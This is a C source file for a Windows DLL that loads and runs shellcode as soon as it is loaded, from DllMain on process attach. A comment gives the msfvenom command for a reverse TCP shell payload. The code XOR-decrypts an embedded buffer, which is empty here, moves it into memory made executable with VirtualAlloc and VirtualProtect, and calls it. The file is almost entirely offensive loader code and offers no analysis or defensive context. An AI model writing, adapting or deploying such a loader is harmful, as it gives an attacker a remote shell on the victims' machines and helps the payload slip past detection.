#include <stdio.h>
#include <Windows.h> 

// msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 -f c
unsigned char buffer[] =
"";

unsigned char key = 'k'; 

void PayloadDecryption(unsigned char* pShellcode, SIZE_T sShellcodeSize, unsigned char encryptionkey) {
    for (unsigned int i = 0; i < sShellcodeSize; i++)
    {
        pShellcode[i] ^= key; 
    }

}
int PayloadExecution(unsigned char* pShellcode, SIZE_T sShellcodeSize)
{
    // allocate memory to payload
    void* execMem = VirtualAlloc(NULL, sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); 
    if (execMem == NULL)
    {
        printf("[-] Virtual allocator failed: %d", GetLastError()); 
        return -1; 
    }

    // copy decrypted payload to memory
    memcpy(execMem, pShellcode, sShellcodeSize); 

    // change protection settings of payload
    DWORD oldProtect;
    if (!VirtualProtect(execMem, sShellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("[-] VirtualProtect failed: %d\n", GetLastError());
        VirtualFree(execMem, 0, MEM_RELEASE); // Free the allocated memory on failure
        return -1;
    }

    // Assuming the shellcode is a function of type void(*)()
    void (*shellcodeFunc)() = (void (*)())execMem;
    shellcodeFunc(); // Execute the shellcode

    // Clean up
    VirtualFree(execMem, 0, MEM_RELEASE);
    return 0;

}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        PayloadDecryption(buffer, sizeof(buffer), key); 
        // Attempt to execute the decrypted payload
        if (PayloadExecution(buffer, sizeof(buffer)) != 0) {
            printf("[-]Payload execution failed.\n");
            return FALSE;
        }
        break; 
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE; 
}

